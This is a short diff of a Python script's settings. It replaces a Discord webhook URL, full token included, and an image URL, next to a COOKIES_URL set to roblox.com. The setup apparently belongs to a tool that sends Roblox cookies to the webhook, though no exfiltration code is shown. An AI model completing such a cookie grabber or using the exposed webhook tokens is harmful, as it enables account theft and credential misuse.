@@ -3,10 +3,10 @@ from bs4 import BeautifulSoup
 import discord
 
 # Discord Webhook settings
-WEBHOOK_URL = "https://discord.com/api/webhooks/1466864809336115495/WBtAV0ia3DmKjB1N6bcpCkDKJ8tSzXLC52SpJ7HixtpgzY_gLZlSYuABASAv5OfNWo4s"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1541206294927511622/uxiWfvAsZE_rWaBA5gZiFJAPRGf3AWKvV92SEwjmH2SANjaE66zd9ghk8gUzeoNYy1oD"
 
 # Image URL
-IMAGE_URL = "https://th.bing.com/th/id/R.1bf215cfc038b9e3a8d4dbbb0f7d1de0?rik=U0%2fP0ec%2bpKgJMA&pid=ImgRaw&r=0.jpg"
+IMAGE_URL = "https://th.bing.com/th/id/OIP.hHqf7ICstOhDI3F3DK3suwHaHa?w=182&h=182&c=7&r=0&o=7&pid=1.7&rm=3"
 
 # Cookies URL
 COOKIES_URL = "https://roblox.com"  # Replace with the actual cookies URL
